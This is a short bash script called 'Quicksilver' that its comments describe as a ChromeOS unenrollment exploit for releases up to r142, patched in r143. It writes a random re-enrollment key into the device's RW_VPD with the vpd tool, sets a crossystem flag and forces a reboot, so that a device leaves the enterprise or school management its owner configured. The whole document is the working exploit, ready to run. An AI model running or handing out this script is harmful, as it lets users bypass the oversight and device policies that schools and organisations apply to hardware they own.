#!/bin/bash
# Quicksilver: unenrollment for <=r142 (<=kernver 6 on most devices)
# Patched in https://crrev.com/c/7046068
# Found by emerwyi, this script written by OlyB

set -eE

SCRIPT_DATE="[2025-12-15]"

clear
echo "Welcome to Quicksilver."
echo "Script date: ${SCRIPT_DATE}"
echo ""
echo "This will unenroll the device."
echo "Note that this exploit is patched in ChromeOS r143."
echo "Continue? (y/N)"
read -r action
case "$action" in
	[yY]) : ;;
	*) echo "Abort."; exit 1 ;;
esac

vpd -i RW_VPD -s re_enrollment_key="$(hexdump -e '1/1 "%02x"' -v -n 32 /dev/urandom)"
crossystem disable_dev_request=1 || :
crossystem disable_dev_request=1 # grunt weirdness

echo "Finished! Press enter to reboot."
read -rs
reboot -f
sleep infinity
